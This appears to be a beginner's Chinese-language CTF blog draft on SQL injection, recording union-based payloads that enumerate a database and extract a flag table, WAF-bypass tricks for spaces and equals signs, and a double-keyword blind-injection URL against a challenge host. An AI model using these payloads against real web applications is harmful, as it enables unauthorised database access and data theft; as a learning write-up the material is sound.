---
title: '小白的sql注入'
date: 2019-01-01
category: 'ctf那些事儿'
tags: []
lang: 'zh'
draft: true
---
# 判断有无单引号报护
![](https://upload-images.jianshu.io/upload_images/10651191-2d5e103e6fa43032.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

如果有单引号报护， 
1' #

注释掉其后的单引号

# and 1=1

1' and 1=1 #

![依然回显数据](https://upload-images.jianshu.io/upload_images/10651191-ca5bb17a1546d74e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1 and 1=2

![](https://upload-images.jianshu.io/upload_images/10651191-111f574244fba2db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
解决了我的一个疑惑， 就是如果 是 ’1 and 1=2' 还会不会执行语句， 现在看来是会的

1' order by 10 #
![](https://upload-images.jianshu.io/upload_images/10651191-c6dcbbe0fb086c8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后就判断数据表只有 4列

1' union select database(), user() #

![](https://upload-images.jianshu.io/upload_images/10651191-4e4b366082277a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

提示列数不一样
![](https://upload-images.jianshu.io/upload_images/10651191-e43ec7bfbe876216.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1' union select  database(),2,3 , 4#

![image.png](https://upload-images.jianshu.io/upload_images/10651191-824d2e9e185d0296.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![](https://upload-images.jianshu.io/upload_images/10651191-760039a94404a2e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1' union select  database(),2,3 , user()#

![](https://upload-images.jianshu.io/upload_images/10651191-cc1b7da7bfb9c6f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

所以database是 luozhen
用户名是 luozhen@127.0.0.1

1' union select table_name,table_schema 3,4 from information_schema.tables where table_schema= 'luozhen'#

获得了版本信息
![](https://upload-images.jianshu.io/upload_images/10651191-e93782acefe97183.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

@@version_compile_os
用这个得到了操作系统的信息

![](https://upload-images.jianshu.io/upload_images/10651191-efcdc60cbdd80171.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1' union select table_name,table_schema 3,4 from information_schema.tables where table_schema= 'luozhen'#

这个出问题了，并没有成功
![](https://upload-images.jianshu.io/upload_images/10651191-0ba67ef3de10de1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

1' union select table_name,table_schema ,3,4 from information_schema.tables where table_schema= 'luozhen'#

原来是少了个逗号

![ok这次成功了](https://upload-images.jianshu.io/upload_images/10651191-ada07e7ef4e83c55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

说明有一个flag的表

哇哈好兴奋， 成功了

payload 如下：

1' union select 1,flag, 2,3 from flag# 
![](https://upload-images.jianshu.io/upload_images/10651191-08a84819b45442c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

# 绕过waf的几种方式

## 绕过空格
用() 或者 /**/

![绕过空格](https://upload-images.jianshu.io/upload_images/10651191-e2e79661df441048.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## 绕过 =
用<>

## 提取字符
ascii()默认提取第一个字符
mid()from 1 for 3 
substr()
surstring()

## 拼接字符
concat()

# 注入分类

## 基于布尔的盲注

这是异或注入
![](https://upload-images.jianshu.io/upload_images/10651191-993f0559365603f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

http://120.24.86.145:9004/1ndex.php?id=-1' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+

再补充一点和mysql相关的。。
![](https://upload-images.jianshu.io/upload_images/10651191-83e8f6dad2bbd615.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
